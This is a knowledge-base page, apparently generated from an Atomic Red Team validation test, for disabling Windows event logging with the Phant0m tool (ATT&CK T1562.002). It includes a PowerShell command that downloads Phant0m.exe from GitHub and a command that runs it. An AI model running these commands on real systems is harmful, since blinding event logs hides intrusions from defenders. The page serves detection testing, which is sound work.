---
atomic_guid: "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741"
title: "Makes Eventlog blind with Phant0m"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.002"
attack_technique_name: "Impair Defenses: Disable Windows Event Logging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.yaml"
build_date: "2026-04-27 19:12:28"
executor: "command_prompt"
aliases:
  - "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741"
  - "Makes Eventlog blind with Phant0m"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses#^t1562002-disable-windows-event-logging|T1562.002: Disable Windows Event Logging]]

## Input Arguments

### file_name

- description: exe version of Phant0m
- type: path
- default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe

## Dependencies

Phant0m.exe must exist on disk at specified location (#{file_name})

### Prerequisite Check

```powershell
if (Test-Path "#{file_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
```

## Executor

- name: command_prompt

### Command

```cmd
"#{file_name}"
```

### Cleanup

```cmd
echo "Sorry you have to reboot"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.yaml)
